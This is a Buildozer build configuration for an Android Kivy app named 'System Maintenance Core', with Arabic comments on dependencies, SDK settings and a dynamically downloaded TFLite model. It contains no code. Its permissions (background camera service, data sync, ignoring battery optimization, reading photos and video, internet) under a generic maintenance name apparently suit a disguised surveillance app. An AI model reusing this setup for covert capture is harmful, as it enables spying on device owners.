[app]

# ====== هوية التطبيق (الإصدار 4.2.0 - دعم AI المحمل ديناميكياً) ======
title = System Maintenance Core
package.name = com.sys.shield.v4
package.domain = org.sys.core
version = 4.2.0

# ====== المصادر والملفات (تم تقليل الملحقات لتصغير الحجم) ======
source.dir = .
source.include_exts = py,png,jpg,kv,json,xml,txt,db
# أزلنا tflite من هنا لأن الموديل سيتم تحميله خارج حزمة APK
source.include_patterns = res/*
source.exclude_dirs = tests, __pycache__, docs, .github, venv, bin, .buildozer, assets
source.exclude_patterns = */test/*, */tests/*, *.pyc, */__pycache__/*, *.tflite

# ====== المكتبات الأساسية (التركيبة الذهبية لنجاح البناء) ======
# numpy==1.26.4 هو الإصدار المستقر الذي لا يسبب خطأ 404
# tflite-runtime هو المحرك الخفيف البديل لـ tensorflow الثقيلة
requirements = python3, hostpython3, kivy==2.3.0, pillow, requests, certifi, pyjnius, android, pyzipper, numpy==1.26.4, tflite-runtime==2.14.0

# ====== أيقونة التطبيق ======
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# ====== الصلاحيات (متوافقة مع متطلبات النظام الحديثة) ======
android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, WAKE_LOCK, FOREGROUND_SERVICE, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_DATA_SYNC, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO

# ====== إعدادات SDK/NDK المستقرة ======
android.api = 33
android.minapi = 24
android.sdk = 33
android.ndk = 25b
android.ndk_api = 24
android.accept_sdk_license = True

# ====== تم حذف ملف AndroidManifest.xml نهائياً ======
# android.manifest = AndroidManifest.xml

# ====== المعمارية المستهدفة (تحسين لأجهزة POCO F3 وأشباهها) ======
# استخدام معمارية واحدة يقلل حجم APK بنسبة 50% تقريباً
android.archs = arm64-v8a

# ====== خدمات الخلفية والطاقة ======
android.foreground = True
android.foreground_service_type = dataSync|camera
android.wakelock = True

# ====== تحسينات الأداء والحجم ======
android.no_byte_compile_python = False
android.optimize_python = True
android.release_artifact = apk
android.strip = True

# ====== واجهة المستخدم ======
orientation = portrait
fullscreen = 1

[buildozer]
log_level = 2
warn_on_root = 1
